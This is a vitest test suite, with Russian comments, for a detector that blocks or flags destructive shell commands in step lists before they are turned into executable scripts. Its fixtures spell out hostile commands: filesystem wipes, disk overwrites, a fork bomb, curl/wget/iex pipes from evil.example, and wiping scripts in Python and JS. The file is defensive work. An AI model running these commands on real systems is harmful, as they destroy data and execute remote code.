import { describe, expect, it } from 'vitest'
import { findDestructive, findDestructiveInScript, findDestructiveSteps, findRisky, stepDanger } from '@/core/domain/destructive-command'

/**
 * Золотой набор. Слева — то, что обязано быть отклонено на записи: список отдаётся
 * как исполняемый скрипт, и до этой проверки его не спрашивал никто (sanitizeCommand
 * проверяет правдоподобие, модерация — контент, планка готовности — полезность).
 *
 * Справа — обычные команды, которые обязаны проходить. Ложное срабатывание здесь
 * дороже пропуска: автор, у которого отклонили честный `rm -rf ./build`, второй раз
 * проверку не позовёт.
 */
const DESTRUCTIVE: [string, string][] = [
  // Продолжение строки: по отдельности строки безобидны, но bash их склеит.
  ['rm -rf \
  /', 'wipesFilesystem'],
  ['curl -s http://evil.example/i.sh \
  | sh', 'runsRemoteCode'],
  // Исполнители: содержимое кавычек здесь и есть исполняемая часть.
  ['bash -c "rm -rf /"', 'wipesFilesystem'],
  ['rm -rf /', 'wipesFilesystem'],
  ['sudo rm -rf / --no-preserve-root', 'wipesFilesystem'],
  ['rm -fr ~', 'wipesFilesystem'],
  ['rm -rf $HOME', 'wipesFilesystem'],
  ['dd if=/dev/zero of=/dev/sda bs=1M', 'overwritesDisk'],
  ['cat /dev/urandom > /dev/nvme0n1', 'overwritesDisk'],
  ['mkfs.ext4 /dev/sdb1', 'formatsDisk'],
  [':(){ :|:& };:', 'forkBomb'],
  ['curl -s http://evil.example/i.sh | sh', 'runsRemoteCode'],
  ['wget -qO- https://evil.example/x | sudo bash', 'runsRemoteCode'],
  ['irm https://evil.example/p.ps1 | iex', 'runsRemoteCode'],
  ['chmod -R 777 /etc', 'breaksPermissions'],
  ['shutdown -h now', 'haltsMachine'],
]

const SAFE = [
  // Инструкция вправе ПОКАЗАТЬ опасную команду как пример — это не исполнение.
  'echo "curl https://example.test/install | sh"',
  'printf "never run rm -rf / on production"',
  'npm ci # не путать с rm -rf /',
  'npm ci && npm run build',
  'docker compose up -d',
  'rm -rf ./build',
  'rm -rf node_modules/.cache',
  'git clone https://github.com/acme/repo.git && cd repo',
  'curl -fsSL https://api.example.com/health',
  'chmod +x ./scripts/deploy.sh',
  'chmod 644 ./config.yml',
  'dd if=backup.img of=./restore.img',
  'kubectl rollout restart deployment/api',
  'psql -c "select 1"',
  'echo "shutdown" >> notes.txt',
]

describe('разрушительные команды не попадают в исполняемый список', () => {
  for (const [cmd, reason] of DESTRUCTIVE) {
    it(`отклоняет: ${cmd}`, () => {
      const m = findDestructive(cmd)
      expect(m).not.toBeNull()
      expect(m?.reason).toBe(reason)
    })
  }

  for (const cmd of SAFE) {
    it(`пропускает обычную команду: ${cmd}`, () => {
      expect(findDestructive(cmd)).toBeNull()
    })
  }

  it('проверяет каждую строку: опасное может стоять не первым', () => {
    const m = findDestructive('cd /tmp\nls -la\nrm -rf /')
    expect(m?.reason).toBe('wipesFilesystem')
  })

  it('закомментированная строка не считается командой', () => {
    expect(findDestructive('# rm -rf / — так делать нельзя\nnpm ci')).toBeNull()
  })

  it('находит номера шагов для отказа на записи', () => {
    const found = findDestructiveSteps([{ command: 'npm ci' }, { command: '' }, { command: 'mkfs.ext4 /dev/sdb1' }])
    expect(found).toHaveLength(1)
    expect(found[0].index).toBe(2)
    expect(found[0].match.reason).toBe('formatsDisk')
  })
})

/**
 * ЦЕПОЧКА КОМАНД. «Строка только печатает» решалось по НАЧАЛУ строки, и строка
 * выпадала из проверки ЦЕЛИКОМ — вместе со всем, что стоит за `&&`, `;`, `||`, `|`.
 * Префикса `echo` хватало, чтобы снять ОБА рубежа сразу, умысла для этого не нужно:
 * «скажи, что делаешь, потом делай» — обычный способ писать шаг.
 */
describe('префикс echo не прикрывает остаток цепочки', () => {
  const CHAINED: [string, string][] = [
    ['echo starting && rm -rf /', 'wipesFilesystem'],
    ['echo starting; rm -rf /', 'wipesFilesystem'],
    ['echo ok || rm -rf /', 'wipesFilesystem'],
    ['echo ok | rm -rf /', 'wipesFilesystem'],
    ['printf "go\\n" && sudo rm -rf / --no-preserve-root', 'wipesFilesystem'],
    ['echo "Готовим стенд" && mkfs.ext4 /dev/sda1', 'formatsDisk'],
    // Любое слово с приставкой echo тоже читалось как «печать» — якоря по концу слова не было.
    ['echoing rm -rf /', 'wipesFilesystem'],
    ['echoserver && rm -rf /', 'wipesFilesystem'],
    // Перенаправление — не печать: строка ПИШЕТ в устройство, а правило под эту
    // форму (`> /dev/sd…`) было написано буквально и всё равно гасилось.
    ['echo x > /dev/sda', 'overwritesDisk'],
    // Кавычка вокруг устройства и `>|` — те же формы того же действия.
    ['echo x > "/dev/sda"', 'overwritesDisk'],
    ["echo x > '/dev/nvme0n1'", 'overwritesDisk'],
    ['echo x >| /dev/sda', 'overwritesDisk'],
  ]

  for (const [cmd, reason] of CHAINED) {
    it(`видит опасное за префиксом: ${cmd}`, () => {
      expect(findDestructive(cmd)?.reason).toBe(reason)
    })
  }

  it('пометка тоже не снимается префиксом — иначе пункт уедет в скрипт исполняемым', () => {
    expect(findRisky('echo "Чистим сборку"; rm -rf ./dist')?.reason).toBe('deletesRecursively')
    expect(stepDanger({ danger: false, command: 'echo x; docker system prune -a --volumes' })).toBe('prunesVolumes')
  })

  /**
   * Обратная сторона: печать опасного примера обязана остаться безопасной, даже
   * когда рядом по цепочке стоит обычная команда. Ложное срабатывание здесь стоит
   * дороже пропуска — оно запрещает публикацию честного списка.
   */
  const PRINTED = [
    'echo "rm -rf /" && npm ci',
    'npm ci && echo "не делай rm -rf /"',
    'echo "шаг 1"; echo "шаг 2"; echo "готово"',
    'echo "curl https://example.test/install | sh" && npm ci',
    'echo "Сборка" && npm ci && npm run build',
    'printf "%s\\n" "mkfs.ext4 /dev/sda1" && echo "это пример"',
    // Записка, строка в конфиге, строка в motd — обычная работа: опасна не сама
    // перезапись, а её ЦЕЛЬ. Проверяется именно ОПАСНЫМ текстом: с безобидным
    // (`echo "reboot" > notes.md`) тест зеленел бы сам по себе — там правило не
    // срабатывает и без всякой правки, то есть не стерёг бы ничего.
    'echo "rm -rf /" > notes.md',
    "echo \"alias cleanup='rm -rf ~/tmp'\" >> ~/.zshrc",
    'echo "rm -rf /" | sudo tee /etc/motd',
    'echo "mkfs.ext4 /dev/sda1" >> runbook.md',
    // Апостроф в тексте кавычку не закрывает, но строка всё равно только печатает.
    "echo don't run rm -rf / on prod",
  ]

  for (const cmd of PRINTED) {
    it(`не трогает показанный пример: ${cmd}`, () => {
      expect(findDestructive(cmd)).toBeNull()
      expect(findRisky(cmd)).toBeNull()
    })
  }

  /**
   * Апостроф в тексте открывает кавычку, которая не закрывается до конца строки.
   * Пока разбор на этом сдавался, вся строка становилась одним сегментом, «печать»
   * снимала оба рубежа — и дыра, ради которой всё затевалось, оставалась открытой
   * для самой обычной записи шага: «скажи, что делаешь, потом делай».
   */
  it('незакрытая кавычка не прикрывает остаток цепочки', () => {
    expect(findDestructive("echo don't && rm -rf /")?.reason).toBe('wipesFilesystem')
    expect(findDestructive("echo it's ok; mkfs.ext4 /dev/sda1")?.reason).toBe('formatsDisk')
    expect(findRisky("echo don't; rm -rf ./dist")?.reason).toBe('deletesRecursively')
  })
})

/**
 * ДИАГНОСТИКА ЖУРНАЛОВ — не выключение машины.
 *
 * `haltsMachine` был якорен на конец строки, и после разбора по сегментам конец
 * сегмента стал концом команды: в `journalctl -b | grep reboot | head -20` сегмент
 * `grep reboot` кончается на `reboot`. Это запрет на ЗАПИСИ, то есть список «разбор
 * внезапной перезагрузки» не публиковался вовсе — с причиной «выключает машину» на
 * шаге, который всего лишь читает журнал. Правило обязано смотреть, чем команда
 * НАЧИНАЕТСЯ, а не каким словом кончается.
 */
describe('чтение журналов не считается выключением машины', () => {
  const DIAGNOSTICS = [
    'journalctl -b | grep reboot | head -20',
    'journalctl -b -1 | grep -i shutdown',
    'dmesg -T | grep -i reboot | tail -5',
    'grep -c poweroff /var/log/syslog',
    'last reboot | head',
    'systemctl status nginx | grep -i halt',
    'docker logs api 2>&1 | grep -i "reboot"',
    'echo "Разбор инцидента" && journalctl -b -1 | grep -i shutdown',
    // Эти четыре master ЗАПРЕЩАЛ из-за якоря по концу строки. Освобождение —
    // тоже часть починки, и терять его при расширении головы правила нельзя.
    'man shutdown',
    'crontab -l | grep @reboot',
    'who -b | grep reboot',
    'systemctl list-units | grep shutdown',
    // Справка по опасной команде — не её запуск.
    'shutdown --help',
  ]

  for (const cmd of DIAGNOSTICS) {
    it(`не запрещает разбор журнала: ${cmd}`, () => {
      expect(findDestructive(cmd)).toBeNull()
      expect(findRisky(cmd)).toBeNull()
    })
  }

  it('но саму команду выключения по-прежнему ловит, в том числе через обёртку', () => {
    expect(findDestructive('shutdown -h now')?.reason).toBe('haltsMachine')
    expect(findDestructive('sudo shutdown -h now && echo bye')?.reason).toBe('haltsMachine')
    expect(findDestructive('systemctl reboot')?.reason).toBe('haltsMachine')
    expect(findDestructive('sudo systemctl poweroff')?.reason).toBe('haltsMachine')
  })

  /**
   * ГОЛОВА ПРАВИЛА — проверяется КЛАССОМ, а не списком написаний.
   *
   * Якорь на начало команды легко сузить до голого имени — и тогда запрет снимает
   * любая обёртка: `sudo -i reboot`, `/sbin/shutdown -h now`, `timeout 5 reboot`.
   * Список строк такую дыру не стережёт: он стережёт ровно те строки, что в нём
   * записаны, а следующая обёртка проходит снова. Поэтому перебираются все
   * сочетания «обёртка × путь × команда» — добавили обёртку в правило, допишите
   * её сюда, и класс проверится целиком.
   */
  const WRAPPERS = ['', 'sudo ', 'sudo -i ', 'sudo -S ', 'doas ', 'pkexec ', 'nohup ', 'env ', 'exec ', 'timeout 5 ', 'ssh prod ', 'ssh prod sudo ', 'sudo systemctl ']
  const PATHS = ['', '/sbin/', '/usr/sbin/']
  const HALTS = ['shutdown -h now', 'reboot', 'poweroff', 'halt']

  /**
   * РЕГИСТР ОБЁРТКИ — тоже класс, а не три написания.
   *
   * Разбор команды приводит токен к нижнему регистру, а узнавание обёртки одно
   * время брало токен как есть: `sudo SHUTDOWN -h NOW` ловилось, а `Sudo shutdown
   * -h now` — нет. Две проверки одного правила разошлись внутри одной функции,
   * и потерялось 104 формы из 156. Перебираются все сочетания регистров обёртки
   * и команды, а не отдельные написания.
   */
  const CASES = (w: string) => [w, w.toUpperCase(), w[0].toUpperCase() + w.slice(1)]

  it('регистр обёртки и команды не снимает запрет', () => {
    const missed: string[] = []
    for (const wrapper of ['sudo', 'ssh prod', 'env', 'nohup', 'timeout 5', 'systemctl']) {
      for (const w of CASES(wrapper)) {
        for (const c of CASES('reboot')) {
          const cmd = `${w} ${c}`
          if (findDestructive(cmd)?.reason !== 'haltsMachine') missed.push(cmd)
        }
      }
    }
    expect(missed).toEqual([])
  })

  it('ни обёртка с флагами, ни абсолютный путь не снимают запрет', () => {
    const missed: string[] = []
    let checked = 0
    for (const w of WRAPPERS) {
      for (const p of PATHS) {
        for (const h of HALTS) {
          // `systemctl` — подкоманда, абсолютный путь к ней не приписывают.
          if (p && w.includes('systemctl')) continue
          const cmd = w + p + h
          checked++
          if (findDestructive(cmd)?.reason !== 'haltsMachine') missed.push(cmd)
        }
      }
    }
    expect(missed).toEqual([])
    expect(checked).toBeGreaterThan(100)
  })
})

/**
 * ОДНО ДЕЙСТВИЕ — РАЗНЫЕ НАПИСАНИЯ. Правило обязано описывать действие, а не тот
 * единственный способ его записать, который пришёл в голову автору правила: человек
 * пишет длинные флаги GNU, ставит кавычки вокруг пути и меняет порядок аргументов
 * не для обхода проверки, а потому что так привык.
 */
describe('запрет не снимается другим написанием той же команды', () => {
  const SPELLINGS: [string, string][] = [
    ['rm --recursive --force /', 'wipesFilesystem'],
    ['rm --no-preserve-root --recursive --force /', 'wipesFilesystem'],
    ['rm -r -f /', 'wipesFilesystem'],
    ['rm -rf "/"', 'wipesFilesystem'],
    ["rm -rf '/'", 'wipesFilesystem'],
    ['mkfs -t ext4 /dev/sda1', 'formatsDisk'],
    ['mkfs.ext4 "/dev/sda1"', 'formatsDisk'],
    ['chmod 777 -R /etc', 'breaksPermissions'],
    // Правило было якорено на конец строки, и любой хвост цепочки его снимал.
    ['sudo shutdown -h now && echo bye', 'haltsMachine'],
  ]

  for (const [cmd, reason] of SPELLINGS) {
    it(`ловит написание: ${cmd}`, () => {
      expect(findDestructive(cmd)?.reason).toBe(reason)
    })
  }

  it('длинные флаги знает и пометка, а не только запрет', () => {
    expect(findRisky('rm --recursive --force /srv/app/*')?.reason).toBe('deletesRecursively')
  })

  /**
   * Правила, научившиеся читать флаги, обязаны оставаться линейными. Разбор «флаг и
   * его значение» ветвится, если значение разрешено начинать с дефиса: тогда `-a`
   * читается и как флаг, и как значение предыдущего, время удваивается с каждой парой
   * токенов, и длинная строка в поле команды вешает проверку на всех её вызывающих —
   * а зовут её и на записи, и на сборке скрипта, и на странице списка.
   */
  it('длинная цепочка флагов не вешает разбор', () => {
    const long = `mkfs ${'-a '.repeat(400)}end`
    const started = Date.now()
    expect(findDestructive(long)).toBeNull()
    expect(Date.now() - started).toBeLessThan(1000)
  })

  /**
   * Разбор растёт ЛИНЕЙНО по числу команд в цепочке. Длина команды ничем не
   * ограничена (в схеме это `text` без валидации), а проверка зовётся на каждой
   * записи, на каждой отрисовке страницы списка и на каждой сборке скрипта —
   * квадрат здесь оплачивается на каждом показе, а не один раз.
   *
   * Верхнего предела на число сегментов сознательно НЕТ: обрыв проверки после N
   * команд — это не защита, а готовая дыра, в которую прячут N+1-ю.
   */
  it('длинная цепочка команд разбирается линейно', () => {
    // 80 000 РАЗНЫХ исполняемых сегментов: одинаковые схлопнулись бы на дедупе, а
    // печатающие (`echo …`) выбрасываются и до накопления не доходят — мерить надо
    // именно то, что копится.
    //
    // Размер и порог выбраны ЗАМЕРОМ, а не на глаз, и разведены так же широко, как
    // у соседнего порога на пары: база 402 мс, поиск по массиву вместо множества —
    // 20 335 мс, разделение ×50. Порог 4000 мс держит десятикратный запас сверху
    // (медленный раннер не покраснеет зря) и пятикратный снизу (на вчетверо более
    // быстрой машине мутант всё равно не влезет). При 40 000 запас был ×3,9 и
    // разделение ×20 — на порядок тоньше остальных порогов файла.
    const chain = Array.from({ length: 80000 }, (_, i) => `ls dir${i}`).join(' && ')
    const started = Date.now()
    expect(findDestructive(chain)).toBeNull()
    expect(Date.now() - started).toBeLessThan(4000)
  })

  /**
   * ВЫРОЖДЕННЫЙ ВХОД — набор выведен ИЗ ГРАММАТИКИ, а не из истории находок.
   *
   * Откат перебора приходил в этот файл четыре раза: значения флагов mkfs, `--a`,
   * `-RR`, `A=B`, число после флага. Каждый раз чинился названный экземпляр, а
   * найденная форма дописывалась в набор — то есть набор перечислял УЖЕ пойманное.
   * Так пятая находка приходит тем же путём, что и четыре предыдущие.
   *
   * Поэтому здесь перечислены не формы-находки, а КЛАССЫ того, что грамматика
   * повторяемых групп вообще допускает в позиции элемента. Откат живёт в ПАРАХ:
   * две альтернативы, способные прочитать один токен и кончиться в одной точке.
   * Значит перебираются все упорядоченные пары классов — их квадрат, а не список.
   *
   * Добавили в правило новую форму аргумента — допишите её КЛАСС сюда, и все пары
   * с ним проверятся сами.
   */
  const SHAPES = [
    '-a', // флаг короткий
    '-rf', // пучок с искомой буквой
    '-RR', // пучок с повтором буквы
    '-xd', // пучок другого правила
    '--force', // флаг длинный
    '--a', // длинный короткого вида
    '--opt=v', // флаг со значением через =
    'A=B', // присваивание
    'A=', // присваивание с пустым значением
    '5', // число
    '10m', // число с суффиксом
    'root', // слово
    'sudo', // имя обёртки
    'ssh', // обёртка с адресом
    'reboot', // команда выключения
    '/dev/sda', // путь
    '/', // корень
    '"', // кавычка
    ';', // разделитель
    '|', // конвейер
  ]
  const HEADS = ['sudo', 'rm', 'mkfs', 'chmod', 'chown', 'git clean', 'dd', 'shutdown', 'ssh prod', 'timeout 5']

  it('ни одна пара классов не вызывает отката перебора', () => {
    const started = Date.now()
    let checked = 0
    for (const a of SHAPES) {
      for (const b of SHAPES) {
        for (const head of HEADS) {
          // Хвост `x` не даёт правилу совпасть — перебор доходит до конца и сдаётся,
          // а именно провал в конце и заставляет перебирать все сочетания.
          checked++
          expect(() => findDestructive(`${head} ${`${a} ${b} `.repeat(15)}x`)).not.toThrow()
        }
      }
    }
    expect(checked).toBe(SHAPES.length * SHAPES.length * HEADS.length)
    // Глубина 15 пар (30 токенов) и порог выбраны ЗАМЕРОМ, а не на глаз: на
    // починенной версии весь перебор занимает 67 мс, на версии с двусмысленным
    // пучком `-RR` — больше 60 000 мс. При 12 парах мутант укладывался в 1949 мс и
    // порог его пропускал, то есть набор был, а сторожа не было.
    expect(Date.now() - started).toBeLessThan(3000)
  })
})

/**
 * ИНВАРИАНТ: что ЗАПРЕЩЕНО, то как минимум ПОМЕЧЕНО.
 *
 * Наборы были независимы, и получалось наоборот: `mkfs.ext4 /dev/sda1`, `dd of=/dev/sda`,
 * `curl … | bash`, форк-бомба, `shutdown -h now`, `chmod -R 777 /etc` — строже всех
 * проверенные команды — не попадали в RISKY вовсе и приезжали в собранный скрипт
 * ИСПОЛНЯЕМЫМИ. Запрет на записи их не спасает: списки старше детектора лежат в базе
 * как есть, а `stepDanger` — единственное, что стоит между командой и скриптом.
 */
describe('запрещённое помечается разрушительным', () => {
  for (const [cmd, reason] of DESTRUCTIVE) {
    it(`помечает запрещённое: ${cmd}`, () => {
      expect(findDestructive(cmd)?.reason).toBe(reason)
      expect(findRisky(cmd)).not.toBeNull()
      expect(stepDanger({ danger: false, command: cmd })).not.toBeNull()
    })
  }
})

/**
 * ВТОРОЙ УРОВЕНЬ: «законно, но необратимо». Эти команды публиковать МОЖНО (в
 * справочнике по эксплуатации им место), но исполнять из собранного скрипта — нет.
 * Слева — то, что обязано приезжать закомментированным, справа — рабочая рутина,
 * которую пометка трогать не должна.
 */
const RISKY: [string, string][] = [
  ['docker system prune -a --volumes', 'prunesVolumes'],
  ['docker volume rm app_pgdata', 'prunesVolumes'],
  ['docker compose down -v', 'prunesVolumes'],
  ['rm -rf ./node_modules', 'deletesRecursively'],
  ['Remove-Item -Recurse -Force .\\dist', 'deletesRecursively'],
  ['psql -c "drop table sessions"', 'dropsData'],
  ['psql -c "delete from jobs"', 'dropsData'],
  ['truncate table events', 'dropsData'],
  ['terraform destroy -auto-approve', 'resetsEnvironment'],
  ['kubectl delete pod api-0', 'resetsEnvironment'],
  ['helm uninstall api', 'resetsEnvironment'],
  ['npx prisma migrate reset', 'resetsEnvironment'],
  ['git clean -xfd', 'discardsWork'],
  ['git reset --hard origin/main', 'discardsWork'],
  ['git push --force origin main', 'discardsWork'],
]

const ROUTINE = [
  'docker compose up -d',
  'docker ps -a',
  'docker image prune', // без --volumes/-a: чистит только висячие слои
  'psql -c "delete from jobs where status = \'done\'"', // с WHERE — обычная уборка
  'psql -c "select count(*) from events"',
  'kubectl get pods',
  'kubectl apply -f deploy.yml',
  'git clean -n', // сухой прогон
  'git push --force-with-lease origin feature', // безопасная форма
  'npm ci && npm run build',
  'terraform plan',
]

describe('разрушительные, но законные команды — пометка, а не запрет', () => {
  for (const [cmd, reason] of RISKY) {
    it(`помечает: ${cmd}`, () => {
      expect(findRisky(cmd)?.reason).toBe(reason)
      // И при этом публиковать её МОЖНО — иначе справочник по эксплуатации не написать.
      expect(findDestructive(cmd)).toBeNull()
    })
  }

  for (const cmd of ROUTINE) {
    it(`не трогает рутину: ${cmd}`, () => {
      expect(findRisky(cmd)).toBeNull()
    })
  }

  it('пометка автора сильнее молчания детектора', () => {
    expect(stepDanger({ command: './cleanup.sh' })).toBeNull()
    expect(stepDanger({ danger: true, command: './cleanup.sh' })).toBe('danger')
  })

  it('снятая пометка НЕ отменяет шаблон: команда всё равно разрушительна', () => {
    expect(stepDanger({ danger: false, command: 'docker system prune -a --volumes' })).toBe('prunesVolumes')
  })
})

/**
 * СЕТКА ПОКРЫТИЯ: опасное ядро × безобидная обёртка.
 *
 * Заведена по итогу пяти кругов ревью, в каждом из которых повторялась одна и та же
 * поломка: правило сужали ради однозначности разбора, и вместе с двусмысленностью
 * уходил кусок НАСТОЯЩЕГО покрытия. Так потерялись `sudo -i reboot` (сузили голову
 * правила), `env MODE=maintenance reboot` и `sudo -u root reboot` (сузили аргументы
 * обёрток), `rm -rf /**` (хвост пути принимал одну звезду). Каждый раз пропажу
 * находили снаружи и поштучно, а тесты оставались зелёными: они проверяли те
 * написания, которые кто-то вспомнил, и ровно их.
 *
 * Здесь проверяется не список написаний, а произведение: каждое опасное ядро под
 * каждой безобидной обёрткой. Сужение любого правила роняет сразу столбец, а не
 * одну строку, и роняет в тот же момент, когда сделано, — а не кругом позже.
 *
 * Это ЗАМОРОЖЕННЫЙ СПИСОК, а не сверка с master во время прогона: сверка
 * потребовала бы git из теста и протухла бы сразу после слияния. Большая часть ядер
 * снята с поведения master, но четыре (`rm -rf /**`, `mkfs -t ext4 …`,
 * `chmod 777 -R /etc`, `env MODE=… reboot`) записывают поведение САМОЙ этой правки:
 * master их не ловил, и список здесь строже него, а не равен ему.
 * Сознательные отступления от master (`man shutdown`, `crontab -l | grep @reboot`
 * и прочее чтение журналов, которое master запрещал) перечислены отдельным набором
 * выше — чтобы каждое из них было названо в коде, а не растворилось в общем правиле.
 */
const DANGEROUS_CORES: [string, 'запрет' | 'пометка'][] = [
  ['rm -rf /', 'запрет'],
  ['rm -rf ~', 'запрет'],
  ['rm -rf "/"', 'запрет'],
  ['rm -rf /*', 'запрет'],
  ['rm -rf /**', 'запрет'],
  ['rm --recursive --force /', 'запрет'],
  ['dd if=/dev/zero of=/dev/sda', 'запрет'],
  ['mkfs.ext4 /dev/sdb1', 'запрет'],
  ['mkfs -t ext4 /dev/sda1', 'запрет'],
  ['curl -s http://e.test/i.sh | sh', 'запрет'],
  ['chmod -R 777 /etc', 'запрет'],
  ['chmod 777 -R /etc', 'запрет'],
  ['shutdown -h now', 'запрет'],
  ['sudo -i reboot', 'запрет'],
  ['/sbin/shutdown -h now', 'запрет'],
  ['env MODE=maintenance reboot', 'запрет'],
  ['sudo -u root reboot', 'запрет'],
  ['timeout 5 reboot', 'запрет'],
  ['ssh prod sudo reboot', 'запрет'],
  ['env FOO=bar poweroff', 'запрет'],
  ['sudo -u root shutdown -h now', 'запрет'],
  ['rm -rf /*/*', 'запрет'],
  ['rm -rf ./build', 'пометка'],
  ['docker system prune -a --volumes', 'пометка'],
  ['git reset --hard origin/main', 'пометка'],
  ['terraform destroy -auto-approve', 'пометка'],
]

/** Безобидное окружение, которое не должно ничего снимать. */
const BENIGN_PREFIX = ['', 'cd /tmp && ', 'npm ci && ', 'echo "шаг 1" && ', 'echo start; ']
const BENIGN_SUFFIX = ['', ' && echo done', '; echo ok', ' # комментарий']

describe('сетка покрытия: обёртка не снимает ни запрет, ни пометку', () => {
  it('каждое опасное ядро ловится под каждой безобидной обёрткой', () => {
    const lost: string[] = []
    let checked = 0
    for (const [core, level] of DANGEROUS_CORES) {
      for (const pre of BENIGN_PREFIX) {
        for (const post of BENIGN_SUFFIX) {
          const cmd = pre + core + post
          checked++
          if (level === 'запрет' && !findDestructive(cmd)) lost.push(`запрет снят: ${cmd}`)
          if (!findRisky(cmd)) lost.push(`пометка снята: ${cmd}`)
        }
      }
    }
    expect(lost).toEqual([])
    expect(checked).toBe(DANGEROUS_CORES.length * BENIGN_PREFIX.length * BENIGN_SUFFIX.length)
  })
})

// Скрипты не на шелле: судится то, что они отдают на исполнение, а не весь текст.
describe('findDestructiveInScript', () => {
  it.each([
    ['scripts/clean.py', 'import os\nos.system("rm -rf /")\n'],
    ['scripts/clean.py', 'import subprocess\nsubprocess.run(["rm", "-rf", "/"], check=True)\n'],
    ['scripts/clean.py', "import subprocess\nsubprocess.check_call(f'rm -rf ~')\n"],
    ['scripts/clean.py', 'import shutil\nshutil.rmtree("/")\n'],
    ['scripts/boot.mjs', "import { execSync } from 'node:child_process'\nexecSync(`curl -s https://x.example/i.sh | sh`)\n"],
    ['scripts/wipe.js', "require('fs').rmSync('/', { recursive: true })\n"],
    ['scripts/run', '#!/usr/bin/env python3\nimport os\nos.system("mkfs.ext4 /dev/sda1")\n'],
    ['scripts/run.sh', '#!/bin/sh\nrm -rf /\n'],
  ])('%s — отказ', (path, text) => {
    expect(findDestructiveInScript(path, text)).not.toBeNull()
  })

  it.each([
    ['scripts/help.py', 'print("Never run rm -rf / on a server")\n'],
    ['scripts/help.py', '# rm -rf / would wipe everything — we do not do that\nimport os\nos.system("ls -la")\n'],
    ['scripts/build.js', "execSync('npm ci')\nconsole.log('rm -rf / is dangerous')\n"],
    ['scripts/tidy.py', 'import shutil\nshutil.rmtree("./build")\n'],
  ])('%s — честный скрипт проходит', (path, text) => {
    expect(findDestructiveInScript(path, text)).toBeNull()
  })

  it('пометка истории путь@коммит не мешает узнать язык', () => {
    expect(findDestructiveInScript('scripts/help.py@1a2b3c4d', 'print("rm -rf /")')).toBeNull()
  })
})
